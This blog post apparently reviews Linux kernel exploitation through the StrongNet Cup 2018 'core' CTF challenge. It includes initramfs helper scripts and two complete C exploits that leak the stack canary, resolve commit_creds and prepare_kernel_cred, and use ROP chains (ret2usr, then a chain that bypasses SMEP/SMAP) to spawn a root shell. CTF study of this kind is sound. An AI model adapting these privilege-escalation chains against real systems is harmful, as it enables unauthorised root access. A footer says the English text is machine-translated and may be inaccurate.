---
title: 「Kernel Pwn」简单复习一下 kernel pwn
authors: [nova]
tag: [pwn, kernel]
date: 2024-07-12
---

Recently, I have been replicating some kernel CVEs but found out that I have completely forgotten about the kernel. Decided to make use of these three weeks to review it.

<!--truncate-->

## Attachment Handling

Wrote a few small scripts

```bash title=extract_fs
#!/bin/bash

# Default target folder
folder="fs"

# Parse parameters
while [[ "$#" -gt 0 ]]; do
  case $1 in
  -f | --folder)
    folder="$2"
    shift
    ;;
  *)
    cpio_path="$1"
    ;;
  esac
  shift
done

# Check if cpio_path is provided
if [[ -z "$cpio_path" ]]; then
  echo "Usage: $0 [-f|--folder folder_name] cpio_path"
  exit 1
fi

# Create target folder
mkdir -p "$folder"

# Copy cpio_path to target folder
cp "$cpio_path" "$folder"

# Get filename
cpio_file=$(basename "$cpio_path")

# Enter target folder
cd "$folder" || exit

# Check if file is gzip compressed
if file "$cpio_file" | grep -q "gzip compressed"; then
  echo "$cpio_file is gzip compressed, checking extension..."

  # Check if filename has .gz extension
  if [[ "$cpio_file" != *.gz ]]; then
    mv "$cpio_file" "$cpio_file.gz"
    cpio_file="$cpio_file.gz"
  fi

  echo "Decompressing $cpio_file..."
  gunzip "$cpio_file"
  # Remove .gz extension, get the decompressed filename
  cpio_file="${cpio_file%.gz}"
fi

# Extract cpio file
echo "Extracting $cpio_file to file system..."
cpio -idmv <"$cpio_file"
rm "$cpio_file"
echo "Extraction complete."
```

```bash title=compress_fs
#!/bin/sh

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 cpio_path"
  exit 1
fi

cpio_file="../$1"

find . -print0 |
  cpio --null -ov --format=newc |
  gzip -9 >"$cpio_file"
```

```bash title=kcompile
#!/bin/sh

folder="fs"
cpio_file="initramfs.cpio.gz"
gcc_options=()

while [[ $# -gt 0 ]]; do
    case $1 in
        -f|--folder)
            folder="$2"
            shift
            ;;
        -c|--cpio)
            cpio_file="$2"
            shift
            ;;
        -*)
            gcc_options+=("$1")
            ;;
        *)
            src="$1"
            ;;
    esac
    shift
done

if [ -z "$src" ]; then
    echo "Usage: compile.sh [options] <source file>"
    echo "Options:"
    echo "  -f, --folder <folder>  Specify the folder to store the compiled binary"
    echo "  -c, --cpio <file>      Specify the cpio file name"
    echo "  <other options>        Options to pass to musl-gcc"
    exit 1
fi

out=$(basename "$src" .c)

echo -e "\033[35mCompiling $src to $folder/$out\033[0m"
musl-gcc -static "${gcc_options[@]}" "$src" -Os -s -o "$out" -masm=intel
strip "$out"
mv "$out" "$folder/"
cd "$folder"

echo -e "\033[35mCreating cpio archive $cpio_file...\033[0m"
find . -print0 | cpio --null -ov --format=newc | gzip -9 > "../${cpio_file}"
echo -e "\033[35mDone\033[0m"
```

## Kernel ROP

In this section, we will enhance the protection measures step by step based on the StrongNet Cup 2018 core.

### Analysis

Since the vulnerability analysis is very simple, we will not go into details. Keywords can be searched for further info.

### Lv1. KCanary + KASLR

Originally, I wanted to turn off KCanary as well, but recompiling the kernel is too troublesome.

So Lv1 has KCanary enabled, with other protections disabled.

```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -kernel ./bzImage \
  -initrd ./initramfs.cpio.gz \
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
  -s \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic
```

In this scenario, we only need to read /tmp/kallsyms to obtain the addresses of `commit_creds` and `prepare_kernel_cred`. Even if KASLR is disabled, the kernel base address can still have some offset, hence we mix both approaches here.

First, we need to find the addresses of `commit_creds` and `prepare_kernel_cred` functions.

```c title=exp
syms = fopen("/tmp/kallsyms", "r");
if (syms == NULL) {
    puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
    exit(0);
}

while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
    if (prepare_kernel_cred && commit_creds) {
        break;
    }

    if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
        prepare_kernel_cred = addr;
        printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
    }

    if (!commit_creds && strcmp(name, "commit_creds") == 0) {
        commit_creds = addr;
        printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
    }
}
```

Then we need to calculate the offset. Using tools like `checksec`, we can see PIE is at `0xffffffff81000000`, and similarly, we can find the address for `commit_creds`.

```python
e = ELF('./vmlinux.unstripped')
hex(e.sym['commit_creds'])
```

Hence, the offset is calculated as:

```c title=exp
offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
```

At this point, using stack overflow, we can modify the return address.

```c title=exp
// musl-gcc -static -masm=intel -Wno-error=int-conversion -o exp exp.c  // makes compiler happy
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = (size_t)getroot;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```

### Lv2. KCanary + KASLR + SMEP + SMAP

In the above, we used ret2usr, so what if we add SMEP and SMAP?

The simplest thing to do is, since we have an overflow, just write there.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));

}
```

```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -kernel ./bzImage \
  # highlight-next-line
  -cpu qemu64-v1,+smep,+smap \ 
  -initrd ./initramfs.cpio.gz \
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
  -s \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic
```

:::info
This Content is generated by ChatGPT and might be wrong / incomplete, refer to Chinese version if you find something wrong.
:::

<!-- AI -->
